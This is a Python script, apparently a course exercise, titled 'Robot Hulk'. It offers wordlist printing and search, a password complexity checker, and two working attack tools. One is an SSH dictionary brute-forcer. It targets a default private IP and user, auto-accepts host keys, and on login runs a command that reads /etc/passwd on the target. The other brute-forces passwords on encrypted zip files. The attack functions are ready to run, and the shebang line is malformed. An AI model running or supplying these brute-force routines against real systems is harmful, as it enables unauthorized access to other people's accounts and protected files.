#!/bin/bash/env python3

# Author:                       Marcus Nogueira
# Date of latest revision:      01/31/2024
#
# Purpose: Build an automated brute force wordlist
#
# REQUIREMENTS:
# Brute Force attack a zip file
#

from time import sleep
from zipfile import ZipFile
import os
import paramiko


def menu():
    while True:
        print("\n-------------------------------------")
        print("|               Robot Hulk           |")
        print("--------------------------------------")
        print("| 1. Dictionary Iterator             |")
        print("| 2. Search for Word                 |")
        print("| 3. Password Complexity Test        |")
        print("| 4. SSH vs Dictionary               |")
        print("| 5. Brute a Zip                     |")
        print("| Q. Quit                            |")
        print("--------------------------------------")
        choice = input(" Enter menu option: ")
        if choice in ["1", "2", "3", "4", "5"]:
            print()
            return choice
        elif choice.lower() == "q":
            exit()
        else:
            print("Invalid choice. Please choose another option.")
            sleep(.5)


def load_print_dictionary():
    file_path = file_path_input("dictionary")
    file_name = os.path.basename(file_path)
    password_list = []
    print(f"\nPRINTING {file_name}\n")
    with open(file_path, 'r') as file:
        for line in file:
            password_list.append(line.strip())
            print(line.strip())
            sleep(.3)


def load_wordlist():
    file_path = file_path_input("word list")
    file_name = os.path.basename(file_path)
    password_list = []
    print(f"\nLOADING {file_name}\n")
    with open(file_path, 'r') as file:
        for line in file:
            password_list.append(line.strip())

    return password_list


def password_search():
    word = input("Enter word: ")
    file_path = file_path_input("word list")
    file_name = os.path.basename(file_path)
    password_list = []
    print(f'\nSEARCHING {file_name} for "{word}"')
    with open(file_path, 'r') as file:
        for line in file:
            password_list.append(line.strip())

    if word in password_list:
        print(f'"{word}" found.')
    else:
        print(f'"{word}" not found.')


def file_path_input(target):
    file_path = input(f'Enter file path to {target}: ')
    return file_path


def password_complexity():
    print("\n-------------------------------------------")
    print("|               Password Test             |")
    print("-------------------------------------------")
    print("| 1. Must use at least 8 characters       |")
    print("| 2. Must use at least 2 capital letters  |")
    print("| 3. Must use at least 2 numbers          |")
    print("| 4. Must use at least 2 symbols          |")
    print("-------------------------------------------")
    while True:
        password = input(" Enter password to test: ")
        uppercase_count = check_caps(password)
        num_count = check_nums(password)
        sym_count = check_sym(password)
        print()
        if len(password) >= 8:
            print("Passed LENGTH requirement.")
            sleep(.3)
            if uppercase_count >= 2:
                print("Passed UPPERCASE requirement.")
                sleep(.3)
                if num_count >= 2:
                    print("Passed NUMBERS requirement.")
                    sleep(.3)
                    if sym_count >= 2:
                        print("Passed SYMBOLS requirement.")
                        sleep(.3)
                        print('\nPASSED TEST.')
                        break
                    else:
                        print("Failed SYMBOLS test. Use more SYMBOLS.\n")
                else:
                    print("Failed NUMBERS test. Use more NUMBERS.\n")
            else:
                print("Failed UPPERCASE TEST. Use more UPPERCASE letters.\n")
        else:
            print("Password NOT long enough.\n")


def check_caps(password):
    upper = 0
    for char in password:
        if char.isupper():
            upper += 1

    return upper


def check_nums(password):
    num = 0
    for char in password:
        if char.isnumeric():
            num += 1
    return num


def check_sym(password):
    sym = 0
    for char in password:
        if not char.isalnum():
            sym += 1
    return sym


def ssh_attack():
    ip = input("Enter IPv4 [Default: 192.168.1.18]: ") or "192.168.1.18"
    print(f'Target: {ip}')
    username = input("\nEnter username [Default: anakin]: ") or "anakin"
    print(f'Username: {username}\n')
    word_list = load_wordlist()

    print("BEGINNING RUN")
    for password in word_list:
        res = ssh_attempt(ip, username, password)

        if res == 0:
            print(f'\n[*] User: {username} - Password Found: {password} ')
            exit()
        elif res == 1:
            print(f'[*] User: {username} - Password: {password} - INVALID')


def ssh_attempt(ip, username, password):
    code = 0

    ssh = paramiko.SSHClient()  # Initializes paramike's SSH client.

    # Automatically adds host to ssh key policy, skipping the usual prompt when connecting to a new ssh host
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, 22, username, password)

        stdin, stdout, stderr = ssh.exec_command(
            "cat /etc/passwd | grep -v 'nologin'")
        sleep(.5)
        output = stdout.read()
        decoded_output = output.decode('utf-8')
        print(f'\n{decoded_output}')
    except paramiko.AuthenticationException:
        code = 1

    ssh.close()
    return code


def brute_zip():
    word_list = load_wordlist()
    target_zip = file_path_input("zip file")
    extract_path = input("Enter directory to extract to: ")

    print("\nAttempting to Extract ")
    for password in word_list:
        with ZipFile(target_zip) as zf:
            try:
                zf.extractall(path=extract_path, pwd=bytes(password, 'utf-8'))
                print(f'\n[*] Success! Extracted with password: {password}')
                exit()
            except RuntimeError:
                print(f'[*] Password: {password} - INVALID')


if __name__ == "__main__":
    choice = menu()
    match choice:
        case "1": load_print_dictionary()
        case "2": password_search()
        case "3": password_complexity()
        case "4": ssh_attack()
        case "5": brute_zip()
